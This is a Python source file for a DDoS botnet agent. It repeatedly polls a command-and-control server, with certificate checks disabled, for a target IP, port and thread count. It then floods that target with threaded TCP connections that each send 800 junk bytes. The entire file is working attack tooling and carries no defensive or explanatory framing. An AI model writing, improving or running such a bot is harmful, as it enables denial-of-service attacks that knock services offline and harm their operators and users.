#!/usr/bin/env python3
from flask import Flask, make_response, render_template_string, request
import requests
from time import sleep
from threading import Thread
import socket
import os
import urllib3

urllib3.disable_warnings()

socket.setdefaulttimeout(5)
sleep_timer_in_seconds = 120
app = Flask(__name__)


def get_arguments():
    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument('--command-and-control-url',
                        dest='command_and_control_url',
                        required=True,
                        type=str,
                        help='Specify an URL to the command & control server. This server gives targets to attack. '
                             'Must use HTTPS.')
    options = parser.parse_args()
    return options


class TargetSpecification:
    def __init__(self, resp_json):
        self.attack_in_progress = resp_json['attackInProgress']
        self.current_target_ip = resp_json['targetIp']
        self.current_target_port = resp_json['targetPort']
        self.current_threads_limit = resp_json['threadsLimit']


def get_target_specification(command_and_control_url):
    try:
        resp = requests.get(f'{command_and_control_url}/target',
                            verify=False,
                            headers={
                                'User-Agent': 'parrot-666'
                            })
        if resp.ok and resp.json():
            return TargetSpecification(resp.json())
        else:
            print(resp.status_code)
            print(resp.text)
            raise Exception("Failed to get the target specification")
    except Exception as e:
        print(f'The DDoS agent has failed to get a new target specification: {os.linesep}'
              f'{type(e)} - {e}')


def do_connect(target_ip, target_port, junk="A" * 800):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        sock.send(junk.encode('utf-8'))
        # sock.sendto(junk.encode('utf-8'), (target_ip, target_port))
    except Exception as e:
        print(e)


@app.route('/')
def index():
    pass

options = get_arguments()

print('Starting the main loop. Will continuously ask the C&C server for a new target')
while True:
    print('Getting a new target specification')
    target_specification = get_target_specification(options.command_and_control_url)

    if not target_specification:
        print(f"Sleeping for {sleep_timer_in_seconds} seconds")
        sleep(sleep_timer_in_seconds)
        continue

    if target_specification.attack_in_progress:
        target_ip = target_specification.current_target_ip
        target_port = int(target_specification.current_target_port)
        threads_limit = int(target_specification.current_threads_limit)
        print(f'Launching a new attack against tcp://{target_ip}:{target_port} '
              f'using {threads_limit} number of threads')

        attack_threads = []
        while len(attack_threads) <= threads_limit:
            attack_threads.append(Thread(target=do_connect, args=(target_ip, target_port)))

        for thread in attack_threads:
            thread.start()

        while any(thread.is_alive() for thread in attack_threads):
            pass
    else:
        print(f'Active attack is paused. Sleeping for {sleep_timer_in_seconds} seconds')
        sleep(sleep_timer_in_seconds)
